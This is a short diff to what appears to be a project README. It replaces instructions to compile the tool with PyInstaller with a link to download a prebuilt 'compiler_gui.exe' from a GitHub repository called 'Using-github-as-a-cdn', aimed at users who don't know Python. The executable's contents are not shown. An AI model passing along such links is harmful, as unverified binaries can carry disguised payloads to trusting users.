@@ -1,1 +1,2 @@
-Download All the libs and Compile it with Pyinstaller make sure that Console is on and its one file
+# Use Compiler Instead If you don`t know Python.
+[Download Compiler](https://github.com/Coder-soft/Using-github-as-a-cdn/raw/refs/heads/main/uploads/compiler_gui.exe)
